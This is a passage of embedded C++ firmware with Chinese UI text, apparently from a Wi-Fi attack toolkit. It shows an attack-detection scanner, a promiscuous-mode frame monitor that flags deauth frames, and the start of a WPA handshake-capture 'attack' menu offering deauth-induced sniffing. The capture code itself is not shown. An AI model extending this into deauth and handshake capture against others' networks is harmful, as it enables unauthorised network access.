      default:            lvlColor = 0x07E0; lvlText = "[低]"; break;
    }
    u8g2_for_adafruit_gfx.setForegroundColor(lvlColor);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
    u8g2_for_adafruit_gfx.setCursor(5, yPos);
    String desc = String(lvlText) + " " + e.description;
    int maxW = SCREEN_WIDTH - 10;
    while (desc.length() > 10 && u8g2_for_adafruit_gfx.getUTF8Width(desc.c_str()) > maxW)
      desc.remove(desc.length() - 1);
    u8g2_for_adafruit_gfx.print(desc);
    yPos += 13;
    if (yPos > STOP_BTN_Y - 10) break;
  }

  // 底部按钮
  if (!finished) {
    int sby = 258, sbh = 36;
    tft.fillRoundRect(40, sby, SCREEN_WIDTH - 80, sbh, 6, COLOR_BTN_BACK);
    tft.drawRoundRect(40, sby, SCREEN_WIDTH - 80, sbh, 6, COLOR_WHITE);
    u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BTN_BACK);
    tw = u8g2_for_adafruit_gfx.getUTF8Width("停止检测");
    u8g2_for_adafruit_gfx.setCursor(40 + (SCREEN_WIDTH - 80 - tw) / 2, sby + 24);
    u8g2_for_adafruit_gfx.print("停止检测");
  } else {
    int rby = 258, rbh = 36;
    tft.fillRoundRect(40, rby, SCREEN_WIDTH - 80, rbh, 6, COLOR_CONFIRM_BG);
    tft.drawRoundRect(40, rby, SCREEN_WIDTH - 80, rbh, 6, COLOR_WHITE);
    u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_CONFIRM_BG);
    tw = u8g2_for_adafruit_gfx.getUTF8Width("返回");
    u8g2_for_adafruit_gfx.setCursor(40 + (SCREEN_WIDTH - 80 - tw) / 2, rby + 24);
    u8g2_for_adafruit_gfx.print("返回");
  }
}

// 单次检测扫描（快速扫描当前环境）
static void performDetectScan(std::vector<WiFiScanResult>& allResults,
                               std::set<String>& uniqueBSSIDs) {
  scan_results.clear();
  g_scanDone = false;

  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    unsigned long startMs = millis();
    while (!g_scanDone && (millis() - startMs) < 2500) {
      checkAttackStop();                     // 允许用户停止检测
      if (g_attackStop) break;
      delay(10);
    }
    for (auto& result : scan_results) {
      if (g_attackStop) break;
      if (uniqueBSSIDs.find(result.bssid_str) == uniqueBSSIDs.end()) {
        uniqueBSSIDs.insert(result.bssid_str);
        allResults.push_back(result);
      }
    }
  }
}

void attackDetect() {
  Serial.println("=== 启动攻击检测 ===");

  // 进入检测界面
  g_attackStop = false;
  g_attackRunningType = 5;  // 5 = 攻击检测
  g_screen = SCREEN_ATTACK_RUNNING;

  std::vector<WiFiScanResult> allResults;
  std::set<String> uniqueBSSIDs;
  DetectStats stats;
  memset(&stats, 0, sizeof(stats));

  // 初始化检测心电图
  initDetectECG();

  // 初始界面（绘制标题栏 + ECG框架）
  drawDetectResultsUI(stats, 0, false);

  unsigned long totalStartMs = millis();
  int frameCount = 0;

  // 3轮扫描检测
  for (int pass = 1; pass <= 3; pass++) {
    if (g_attackStop) break;
    frameCount++;

    Serial.print("[检测] 第 ");
    Serial.print(pass);
    Serial.println(" 轮扫描...");

    if (pass == 1) {
      // 第1轮：标准快速扫描
      performDetectScan(allResults, uniqueBSSIDs);
      detectFeedECG((int)allResults.size());  // 脉冲：已发现AP数
    } else if (pass == 2) {
      // 第2轮：重点信道扫描
      int keyCh[] = {1, 6, 11, 36, 40, 44, 48, 149, 153, 157, 161};
      int keyCount = sizeof(keyCh) / sizeof(keyCh[0]);
      for (int ci = 0; ci < keyCount; ci++) {
        checkAttackStop();
        if (g_attackStop) break;
        wext_set_channel(WLAN0_NAME, keyCh[ci]);
        delay(150);
        performDetectScan(allResults, uniqueBSSIDs);
        frameCount++;
        detectFeedECG((int)allResults.size());  // 每个信道的AP累积量
      }
    } else {
      // 第3轮：全信道扫描
      for (int ci = 0; ci < ALL_CH_COUNT; ci++) {
        checkAttackStop();
        if (g_attackStop) break;
        wext_set_channel(WLAN0_NAME, ALL_CH_LIST[ci]);
        delay(100);
        performDetectScan(allResults, uniqueBSSIDs);
        frameCount++;
        detectFeedECG((int)allResults.size());  // 每个信道的AP累积量
      }
    }

    // 分析本轮结果
    collectDetectionResults(allResults, stats);

    // 威胁脉冲（告警数量作为额外数据点）
    detectFeedECG((int)g_detectResults.size());

    // 更新屏幕
    drawDetectResultsUI(stats, pass, false);

    // Serial 输出
    Serial.print("[检测] 第");
    Serial.print(pass);
    Serial.print("轮: 发现 ");
    Serial.print(stats.totalAPs);
    Serial.print(" 个AP, 告警 ");
    Serial.print((int)g_detectResults.size());
    Serial.println(" 条");
    for (auto& e : g_detectResults) {
      Serial.print("  ");
      const char* lvl = (e.level == THREAT_HIGH) ? "!!" :
                        (e.level == THREAT_MEDIUM) ? "! " : "· ";
      Serial.print(lvl);
      Serial.print(" ");
      Serial.print(e.description);
      if (e.detail.length() > 0) {
        Serial.print(" | ");
        Serial.print(e.detail);
      }
      Serial.println();
    }

    // 轮间延时
    if (!g_attackStop && pass < 3) {
      for (int w = 0; w < 10; w++) {
        checkAttackStop();
        if (g_attackStop) break;
        delay(100);
      }
    }
  }

  // 检测完成
  g_attackStop = false;
  drawDetectResultsUI(stats, 3, true);

  unsigned long elapsed = (millis() - totalStartMs) / 1000;
  Serial.println("=== 攻击检测完成 ===");
  Serial.print("耗时: ");
  Serial.print(elapsed);
  Serial.println(" 秒");
  Serial.print("发现AP总数: ");
  Serial.println(stats.totalAPs);
  Serial.print("告警总数: ");
  Serial.println((int)g_detectResults.size());

  // 等待用户触摸返回（60秒超时防止触摸故障卡死）
  Serial.println("触摸屏幕返回按钮退出...");
  bool waitExit = true;
  unsigned long exitStart = millis();
  while (waitExit && millis() - exitStart < 60000) {
    int16_t tx, ty;
    if (touch_read(&tx, &ty)) {
      if (tx >= 40 && tx <= SCREEN_WIDTH - 40 &&
          ty >= 260 && ty <= 300) {
        waitExit = false;
      }
      { unsigned long tmDrain = millis(); while (touch_read(&tx, &ty) && (millis() - tmDrain) < 300) delay(10); }
    }
    delay(30);
  }

  // 返回主菜单
  g_touchValid = false;
  g_attackRunningType = -1;
  g_screen = SCREEN_MAIN;
  currentSelection = 1;
  g_pendingMenuDraw = true;
}

// ==================== 帧监视器 ====================
// 混杂模式回调 — 接收200个字节用于解析（ISR上下文，只记录不绘制）
static void frameMonitorCallback(unsigned char *buf, unsigned int len, void *userdata) {
  (void)userdata;
  if (!buf || len < 24) return;

  g_fmTotal++;
  g_fmLastSeen = millis();

  // 兼容多种 SDK 头偏移
  const int tryOffsets[] = {0, 4, 8, 24, 32, 36, 40};
  int bestOff = -1;
  uint8_t fType = 0, fSubtype = 0;

  for (size_t t = 0; t < sizeof(tryOffsets) / sizeof(tryOffsets[0]); t++) {
    int off = tryOffsets[t];
    if (len < (unsigned)(off + 24)) continue;
    const uint8_t *base = buf + off;
    uint16_t fc = (uint16_t)base[0] | ((uint16_t)base[1] << 8);
    uint8_t type = (fc >> 2) & 0x3;
    uint8_t subtype = (fc >> 4) & 0xF;

    // 优先接受管理帧，其次任意有效帧
    if (type <= 2 && (type == IEEE80211_TYPE_MGMT || bestOff < 0)) {
      bestOff = off;
      fType = type;
      fSubtype = subtype;
      if (type == IEEE80211_TYPE_MGMT) break; // 管理帧=最优
    }
  }

  if (bestOff < 0) return;

  // 按类型统计
  switch (fType) {
    case IEEE80211_TYPE_MGMT:
      g_fmMgmt++;
      switch (fSubtype) {
        case MGMT_SUBTYPE_BEACON:    g_fmBeacon++;    break;
        case MGMT_SUBTYPE_PROBE_REQ: g_fmProbeReq++;  break;
        case MGMT_SUBTYPE_PROBE_RESP:g_fmProbeResp++; break;
        case MGMT_SUBTYPE_DEAUTH:    g_fmDeauth++;    break;
        case MGMT_SUBTYPE_DISASSOC:  g_fmDisassoc++;  break;
        case MGMT_SUBTYPE_AUTH:      g_fmAuth++;      break;
        case MGMT_SUBTYPE_ASSOC_REQ:
        case MGMT_SUBTYPE_ASSOC_RESP:
        case MGMT_SUBTYPE_REASSOC_REQ:
        case MGMT_SUBTYPE_REASSOC_RESP:
          g_fmAssoc++; break;
        default: g_fmOtherMgmt++; break;
      }
      break;
    case IEEE80211_TYPE_CTRL: g_fmCtrl++; break;
    case IEEE80211_TYPE_DATA: g_fmData++; break;
  }

  // 记录 RSSI（兼容不同偏移，放在 buf[24~28] 附近）
  int rssi = (len >= 28) ? (int)((char)buf[27]) : -100;
  g_fmLastRSSI = rssi;

  // 写入环形缓冲区（仅管理帧和控制帧以节省空间，每5帧写1条）
  static int throttleCount = 0;
  throttleCount++;
  if (throttleCount % 5 != 0) return;

  int idx = g_fmRecHead & (FM_RECORD_MAX - 1);
  g_fmRecords[idx].type    = fType;
  g_fmRecords[idx].subtype = fSubtype;
  memcpy(g_fmRecords[idx].src, buf + bestOff + 10, 6);
  g_fmRecords[idx].rssi    = rssi;
  g_fmRecHead++;
  if (g_fmRecCount < FM_RECORD_MAX) g_fmRecCount++;
}

// 启动帧监视器
static void startFrameMonitor() {
  // 清零计数器
  g_fmTotal = g_fmMgmt = g_fmCtrl = g_fmData = 0;
  g_fmBeacon = g_fmProbeReq = g_fmProbeResp = g_fmDeauth = 0;
  g_fmDisassoc = g_fmAuth = g_fmAssoc = g_fmOtherMgmt = 0;
  g_fmLastSeen = 0;
  g_fmRecHead = g_fmRecCount = 0;
  g_fmStartMs = millis();
  g_fmLastDrawMs = 0;
  g_fmChIdx = 0;
  g_fmChannel = ALL_CH_LIST[0];
  g_fmRunning = true;

  WiFi.disablePowerSave();
  wext_set_channel(WLAN0_NAME, g_fmChannel);
  delay(50);

  // 启用混杂模式
  int rc = wifi_set_promisc(RTW_PROMISC_ENABLE_2, frameMonitorCallback, 1);
  Serial.print("[FrameMon] wifi_set_promisc(ENABLE_2) rc=");
  Serial.println(rc);
  if (rc != 0) {
    rc = wifi_set_promisc(RTW_PROMISC_ENABLE, frameMonitorCallback, 1);
    Serial.print("[FrameMon] wifi_set_promisc(ENABLE) rc=");
    Serial.println(rc);
  }
  Serial.println("[FrameMon] 帧监视器已启动");
}

// 停止帧监视器
static void stopFrameMonitor() {
  wifi_set_promisc(RTW_PROMISC_DISABLE, nullptr, 0);
  delay(20);
  g_fmRunning = false;
  g_fmTotalScanMs = millis() - g_fmStartMs;
  Serial.println("[FrameMon] 帧监视器已停止");
}

// 获取帧类型显示名称
static const char* frameTypeName(uint8_t type, uint8_t subtype) {
  if (type == 0) {
    switch (subtype) {
      case  0: return "AscReq";
      case  1: return "AscRsp";
      case  4: return "PrbReq";
      case  5: return "PrbRsp";
      case  8: return "Beacon";
      case 10: return "DisAsc";
      case 11: return "Auth";
      case 12: return "Deauth";
      default: return "Mgmt";
    }
  } else if (type == 1) return "Ctrl";
  else if (type == 2) return "Data";
  return "?";
}

// 获取帧类型颜色
static uint16_t frameTypeColor(uint8_t type, uint8_t subtype) {
  if (type == 0) {
    if (subtype == 12 || subtype == 10) return 0xF800; // Deauth/Disassoc 红色
    if (subtype == 8)  return 0x07E0; // Beacon 绿色
    if (subtype == 4)  return 0xFFE0; // ProbeReq 黄色
    return 0x07FF;                    // 其他管理帧 青色
  }
  if (type == 1) return 0x8410;      // 控制帧 灰色
  return 0xFFFF;                     // 数据帧 白色
}

// 绘制帧监视器 — 仅静态停止按钮（只绘制一次）
static void drawFrameMonitorStopBtn() {
  int sby = 255, sbh = 40;
  tft.fillRoundRect(40, sby, SCREEN_WIDTH - 80, sbh, 6, COLOR_BTN_BACK);
  tft.drawRoundRect(40, sby, SCREEN_WIDTH - 80, sbh, 6, COLOR_WHITE);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BTN_BACK);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width("停止监视");
  u8g2_for_adafruit_gfx.setCursor(40 + (SCREEN_WIDTH - 80 - tw) / 2, sby + 26);
  u8g2_for_adafruit_gfx.print("停止监视");
}

// 绘制帧监视器静态部分（标题栏、标签、分隔线，仅绘制一次）
static void drawFrameMonitorStatic() {
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);

  // ---- 标题栏 ----
  tft.fillRect(0, 0, SCREEN_WIDTH, 36, 0x03E0);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(0x03E0);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width("帧监视器");
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 26);
  u8g2_for_adafruit_gfx.print("帧监视器");

  // 信道指示
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
  u8g2_for_adafruit_gfx.setCursor(SCREEN_WIDTH - 50, 26);
  u8g2_for_adafruit_gfx.print("CH");
  u8g2_for_adafruit_gfx.print(g_fmChannel);

  // ---- 统计标签 ----
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFFF);
  u8g2_for_adafruit_gfx.setCursor(5, 52);
  u8g2_for_adafruit_gfx.print("总:");
  u8g2_for_adafruit_gfx.setCursor(100, 52);
  u8g2_for_adafruit_gfx.print("fps:");

  u8g2_for_adafruit_gfx.setForegroundColor(0x07FF);
  u8g2_for_adafruit_gfx.setCursor(5, 68);
  u8g2_for_adafruit_gfx.print("M:");
  u8g2_for_adafruit_gfx.setForegroundColor(0x8410);
  u8g2_for_adafruit_gfx.setCursor(90, 68);
  u8g2_for_adafruit_gfx.print("C:");
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFFF);
  u8g2_for_adafruit_gfx.setCursor(160, 68);
  u8g2_for_adafruit_gfx.print("D:");

  // ---- 分隔线 + 管理帧子类型标签 ----
  tft.drawLine(0, 80, SCREEN_WIDTH, 80, 0x18E7);
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
  u8g2_for_adafruit_gfx.setCursor(5, 94);
  u8g2_for_adafruit_gfx.print("管理帧子类型:");

  int yRow = 108;
  u8g2_for_adafruit_gfx.setCursor(5, yRow);
  u8g2_for_adafruit_gfx.setForegroundColor(0x07E0);
  u8g2_for_adafruit_gfx.print("Bea:");
  u8g2_for_adafruit_gfx.setCursor(85, yRow);
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
  u8g2_for_adafruit_gfx.print("PbQ:");
  u8g2_for_adafruit_gfx.setCursor(165, yRow);
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
  u8g2_for_adafruit_gfx.print("PbP:");

  yRow = 122;
  u8g2_for_adafruit_gfx.setCursor(5, yRow);
  u8g2_for_adafruit_gfx.setForegroundColor(0xF800);
  u8g2_for_adafruit_gfx.print("Dea:");
  u8g2_for_adafruit_gfx.setCursor(85, yRow);
  u8g2_for_adafruit_gfx.setForegroundColor(0xF800);
  u8g2_for_adafruit_gfx.print("Dis:");
  u8g2_for_adafruit_gfx.setCursor(165, yRow);
  u8g2_for_adafruit_gfx.setForegroundColor(0x07FF);
  u8g2_for_adafruit_gfx.print("Au:");

  // ---- 分隔线 + 近期帧标签 ----
  tft.drawLine(0, 136, SCREEN_WIDTH, 136, 0x18E7);
  u8g2_for_adafruit_gfx.setForegroundColor(0x8410);
  u8g2_for_adafruit_gfx.setCursor(5, 146);
  u8g2_for_adafruit_gfx.print("近期帧:");
}

// 绘制帧监视器动态界面（仅数值和近期帧列表，不碰静态标签和停止按钮）
static void redrawFrameMonitorDynamic() {
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);

  unsigned long total   = g_fmTotal;
  unsigned long mgmt    = g_fmMgmt;
  unsigned long ctrl    = g_fmCtrl;
  unsigned long data    = g_fmData;
  unsigned long elapsed = (millis() - g_fmStartMs) / 1000;
  unsigned long fps     = (elapsed > 0) ? (total / elapsed) : 0;

  // 标题栏 CH 数（可能因信道切换变化）
  tft.fillRect(SCREEN_WIDTH - 30, 10, 25, 18, 0x03E0);
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
  u8g2_for_adafruit_gfx.setBackgroundColor(0x03E0);
  u8g2_for_adafruit_gfx.setCursor(SCREEN_WIDTH - 30, 26);
  u8g2_for_adafruit_gfx.print(g_fmChannel);

  // ---- 统计行1：清除数值区 + 重绘 ----
  tft.fillRect(20, 40, 76, 14, COLOR_BG);   // 总数数值区
  tft.fillRect(128, 40, SCREEN_WIDTH - 128, 14, COLOR_BG); // fps数值区
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFFF);
  u8g2_for_adafruit_gfx.setCursor(22, 52);
  u8g2_for_adafruit_gfx.print((unsigned long)total);
  u8g2_for_adafruit_gfx.setCursor(130, 52);
  u8g2_for_adafruit_gfx.print((unsigned long)fps);

  // ---- 统计行2：清除数值区 + 重绘 ----
  tft.fillRect(20, 56, 66, 14, COLOR_BG);   // M数值区
  tft.fillRect(105, 56, 51, 14, COLOR_BG);  // C数值区
  tft.fillRect(175, 56, SCREEN_WIDTH - 175, 14, COLOR_BG); // D数值区
  u8g2_for_adafruit_gfx.setForegroundColor(0x07FF);
  u8g2_for_adafruit_gfx.setCursor(22, 68);
  u8g2_for_adafruit_gfx.print((unsigned long)mgmt);
  u8g2_for_adafruit_gfx.setForegroundColor(0x8410);
  u8g2_for_adafruit_gfx.setCursor(107, 68);
  u8g2_for_adafruit_gfx.print((unsigned long)ctrl);
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFFF);
  u8g2_for_adafruit_gfx.setCursor(177, 68);
  u8g2_for_adafruit_gfx.print((unsigned long)data);

  // ---- 管理帧子类型：清除数值区 + 重绘 ----
  unsigned long bcn = g_fmBeacon, prq = g_fmProbeReq, prp = g_fmProbeResp;
  unsigned long dea = g_fmDeauth, dis = g_fmDisassoc, aut = g_fmAuth;

  // 行1
  tft.fillRect(30, 96, 51, 14, COLOR_BG);
  tft.fillRect(110, 96, 51, 14, COLOR_BG);
  tft.fillRect(190, 96, SCREEN_WIDTH - 190, 14, COLOR_BG);
  u8g2_for_adafruit_gfx.setForegroundColor(0x07E0);
  u8g2_for_adafruit_gfx.setCursor(32, 108);
  u8g2_for_adafruit_gfx.print((unsigned long)bcn);
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
  u8g2_for_adafruit_gfx.setCursor(112, 108);
  u8g2_for_adafruit_gfx.print((unsigned long)prq);
  u8g2_for_adafruit_gfx.setCursor(192, 108);
  u8g2_for_adafruit_gfx.print((unsigned long)prp);

  // 行2
  tft.fillRect(30, 110, 51, 14, COLOR_BG);
  tft.fillRect(110, 110, 51, 14, COLOR_BG);
  tft.fillRect(190, 110, SCREEN_WIDTH - 190, 14, COLOR_BG);
  u8g2_for_adafruit_gfx.setForegroundColor(0xF800);
  u8g2_for_adafruit_gfx.setCursor(32, 122);
  u8g2_for_adafruit_gfx.print((unsigned long)dea);
  u8g2_for_adafruit_gfx.setCursor(112, 122);
  u8g2_for_adafruit_gfx.print((unsigned long)dis);
  u8g2_for_adafruit_gfx.setForegroundColor(0x07FF);
  u8g2_for_adafruit_gfx.setCursor(192, 122);
  u8g2_for_adafruit_gfx.print((unsigned long)aut);

  // ---- 近期帧滚动列表 (y=148~248) ----
  tft.fillRect(0, 150, SCREEN_WIDTH, 100, COLOR_BG);

  int recCount = g_fmRecCount;
  int showCount = (recCount < 6) ? recCount : 6;
  int startIdx = (recCount > 6) ? (g_fmRecHead - 6) : 0;

  const int ROW_GAP = 15;
  for (int i = 0; i < showCount; i++) {
    int ri = (startIdx + i) & (FM_RECORD_MAX - 1);
    const FrameRecord& r = g_fmRecords[ri];

    int rowY = 163 + i * ROW_GAP;
    if (rowY > 248) break;

    // 帧名
    uint16_t col = frameTypeColor(r.type, r.subtype);
    u8g2_for_adafruit_gfx.setForegroundColor(col);
    u8g2_for_adafruit_gfx.setCursor(5, rowY);
    char buf[10];
    const char* fname = frameTypeName(r.type, r.subtype);
    snprintf(buf, sizeof(buf), "%-6.6s", fname);
    u8g2_for_adafruit_gfx.print(buf);

    // 完整 MAC 地址
    u8g2_for_adafruit_gfx.setForegroundColor(0x8410);
    u8g2_for_adafruit_gfx.setCursor(80, rowY);
    char macStr[20];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             r.src[0], r.src[1], r.src[2], r.src[3], r.src[4], r.src[5]);
    u8g2_for_adafruit_gfx.print(macStr);

    // RSSI
    u8g2_for_adafruit_gfx.setForegroundColor(r.rssi > -60 ? 0x07E0 : (r.rssi > -80 ? 0xFFE0 : 0xF800));
    u8g2_for_adafruit_gfx.setCursor(195, rowY);
    u8g2_for_adafruit_gfx.print(r.rssi);
    u8g2_for_adafruit_gfx.print("dB");
  }
}

// 帧监视器 — 主入口
void frameMonitor() {
  Serial.println("=== 启动帧监视器 ===");

  g_attackStop = false;
  g_attackRunningType = 6;  // 6 = 帧监视器
  g_screen = SCREEN_ATTACK_RUNNING;

  // 先清屏 + 绘制初始界面
  tft.fillScreen(COLOR_BG);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width("正在初始化...");
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 140);
  u8g2_for_adafruit_gfx.print("正在初始化...");

  startFrameMonitor();

  // 首次绘制：静态区（标题/标签/分隔线）+ 动态区 + 停止按钮
  tft.fillScreen(COLOR_BG);
  drawFrameMonitorStatic();
  redrawFrameMonitorDynamic();
  drawFrameMonitorStopBtn();

  // 主循环：定期刷新 UI + 信道轮转
  unsigned long lastChSwitchMs = millis();
  const unsigned long chInterval = 2000;  // 2秒换一次信道

  while (true) {
    checkAttackStop();
    if (g_attackStop) break;
    unsigned long now = millis();
    if (now - lastChSwitchMs >= chInterval) {
      lastChSwitchMs = now;
      g_fmChIdx++;
      if (g_fmChIdx >= ALL_CH_COUNT) g_fmChIdx = 0;
      g_fmChannel = ALL_CH_LIST[g_fmChIdx];
      wext_set_channel(WLAN0_NAME, g_fmChannel);
    }

    // UI 刷新（200ms 间隔，仅刷新动态区，不碰停止按钮）
    if (now - g_fmLastDrawMs >= 200) {
      g_fmLastDrawMs = now;
      redrawFrameMonitorDynamic();
    }

    delay(50);
  }

  // 停止监视器
  stopFrameMonitor();

  // 停止后显示最终统计（保持3秒）
  tft.fillScreen(COLOR_BG);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);

  // 标题
  tft.fillRect(0, 0, SCREEN_WIDTH, 36, 0x07E0);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(0x07E0);
  tw = u8g2_for_adafruit_gfx.getUTF8Width("监视完成");
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 26);
  u8g2_for_adafruit_gfx.print("监视完成");

  // 总统计
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  u8g2_for_adafruit_gfx.setForegroundColor(0xFFFF);
  u8g2_for_adafruit_gfx.setCursor(5, 55);
  u8g2_for_adafruit_gfx.print("总帧数: ");
  u8g2_for_adafruit_gfx.print((unsigned long)g_fmTotal);

  unsigned long elapSec = g_fmTotalScanMs / 1000;
  u8g2_for_adafruit_gfx.setCursor(5, 70);
  u8g2_for_adafruit_gfx.print("运行时间: ");
  u8g2_for_adafruit_gfx.print((unsigned long)elapSec);
  u8g2_for_adafruit_gfx.print(" 秒");

  unsigned long avgFps = (elapSec > 0) ? (g_fmTotal / elapSec) : 0;
  u8g2_for_adafruit_gfx.setCursor(5, 85);
  u8g2_for_adafruit_gfx.print("平均 fps: ");
  u8g2_for_adafruit_gfx.print((unsigned long)avgFps);

  u8g2_for_adafruit_gfx.setForegroundColor(0x07FF);
  u8g2_for_adafruit_gfx.setCursor(5, 105);
  u8g2_for_adafruit_gfx.print("管理帧: ");
  u8g2_for_adafruit_gfx.print((unsigned long)g_fmMgmt);
  u8g2_for_adafruit_gfx.setCursor(5, 120);
  u8g2_for_adafruit_gfx.print("控制帧: ");
  u8g2_for_adafruit_gfx.print((unsigned long)g_fmCtrl);
  u8g2_for_adafruit_gfx.setCursor(5, 135);
  u8g2_for_adafruit_gfx.print("数据帧: ");
  u8g2_for_adafruit_gfx.print((unsigned long)g_fmData);

  // 攻击帧告警
  if (g_fmDeauth > 0 || g_fmDisassoc > 0) {
    u8g2_for_adafruit_gfx.setForegroundColor(0xF800);
    u8g2_for_adafruit_gfx.setCursor(5, 160);
    u8g2_for_adafruit_gfx.print("⚠ 检测到攻击帧:");
    u8g2_for_adafruit_gfx.setCursor(15, 178);
    u8g2_for_adafruit_gfx.print("Deauth:");
    u8g2_for_adafruit_gfx.print((unsigned long)g_fmDeauth);
    u8g2_for_adafruit_gfx.setCursor(15, 196);
    u8g2_for_adafruit_gfx.print("Disassoc:");
    u8g2_for_adafruit_gfx.print((unsigned long)g_fmDisassoc);
  } else {
    u8g2_for_adafruit_gfx.setForegroundColor(0x07E0);
    u8g2_for_adafruit_gfx.setCursor(5, 160);
    u8g2_for_adafruit_gfx.print("✓ 未检测到攻击帧");
  }

  // Serial 日志输出
  Serial.println("=== 帧监视器统计 ===");
  Serial.print("总帧数: ");    Serial.println((unsigned long)g_fmTotal);
  Serial.print("管理帧: ");    Serial.print((unsigned long)g_fmMgmt);
  Serial.print("  信标:");     Serial.print((unsigned long)g_fmBeacon);
  Serial.print("  探测请求:");  Serial.print((unsigned long)g_fmProbeReq);
  Serial.print("  探测响应:");  Serial.print((unsigned long)g_fmProbeResp);
  Serial.print("  Deauth:");   Serial.print((unsigned long)g_fmDeauth);
  Serial.print("  Disassoc:"); Serial.print((unsigned long)g_fmDisassoc);
  Serial.print("  Auth:");     Serial.print((unsigned long)g_fmAuth);
  Serial.print("  Assoc:");    Serial.print((unsigned long)g_fmAssoc);
  Serial.print("  其他:");     Serial.println((unsigned long)g_fmOtherMgmt);
  Serial.print("控制帧: ");    Serial.println((unsigned long)g_fmCtrl);
  Serial.print("数据帧: ");    Serial.println((unsigned long)g_fmData);
  Serial.print("运行时间: ");   Serial.print((unsigned long)elapSec);
  Serial.println(" 秒");

  // 返回按钮
  int rby = 250, rbh = 45;
  tft.fillRoundRect(40, rby, SCREEN_WIDTH - 80, rbh, 6, COLOR_CONFIRM_BG);
  tft.drawRoundRect(40, rby, SCREEN_WIDTH - 80, rbh, 6, COLOR_WHITE);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_CONFIRM_BG);
  tw = u8g2_for_adafruit_gfx.getUTF8Width("返回主菜单");
  u8g2_for_adafruit_gfx.setCursor(40 + (SCREEN_WIDTH - 80 - tw) / 2, rby + 28);
  u8g2_for_adafruit_gfx.print("返回主菜单");

  // 等待触摸返回（60秒超时防止触摸故障卡死）
  Serial.println("触摸返回按钮退出...");
  unsigned long exitStart = millis();
  while (millis() - exitStart < 60000) {
    int16_t tx, ty;
    if (touch_read(&tx, &ty)) {
      if (tx >= 40 && tx <= SCREEN_WIDTH - 40 &&
          ty >= rby && ty <= rby + rbh) {
        break;
      }
      { unsigned long tmDrain = millis(); while (touch_read(&tx, &ty) && (millis() - tmDrain) < 300) delay(10); }
    }
    delay(30);
  }

  g_touchValid = false;
  g_attackRunningType = -1;
  g_screen = SCREEN_MAIN;
  currentSelection = 1;
  g_pendingMenuDraw = true;
}

// ==================== 抓包攻击 (WPA/WPA2 握手包捕获) ====================

// 抓包模式选择 TFT 界面 — 增量重绘：首次全量，后续仅刷新新旧按钮
static void drawCaptureModeBtn(int i, bool sel) {
  static const char* modeNames[] = {"主动模式", "被动模式", "高效模式"};
  static const char* modeDescs[] = {
    "Deauth诱发+嗅探",
    "仅被动嗅探等待",
    "快速突发+嗅探"
  };
  int btnW = 180, btnH = 40, btnX = (SCREEN_WIDTH - btnW) / 2;
  int by = 100 + i * 52;
  uint16_t fillCol = sel ? 0x07E0 : 0x18E3;
  uint16_t borderCol = sel ? 0xFFFF : 0x8410;

  tft.fillRoundRect(btnX, by, btnW, btnH, 6, fillCol);
  tft.drawRoundRect(btnX, by, btnW, btnH, 6, borderCol);

  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(sel ? COLOR_WHITE : 0x8410);
  u8g2_for_adafruit_gfx.setBackgroundColor(fillCol);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width(modeNames[i]);
  u8g2_for_adafruit_gfx.setCursor(btnX + (btnW - tw) / 2, by + 26);
  u8g2_for_adafruit_gfx.print(modeNames[i]);

  // 擦除描述文字区并重绘（按钮选中色变化时描述区背景未必变化，但简单重绘更安全）
  u8g2_for_adafruit_gfx.setForegroundColor(0x8410);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  tw = u8g2_for_adafruit_gfx.getUTF8Width(modeDescs[i]);
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, by + btnH + 10);
  u8g2_for_adafruit_gfx.print(modeDescs[i]);
}

static int drawCaptureModeSelection() {
  int mode = 0, prevMode = -1;
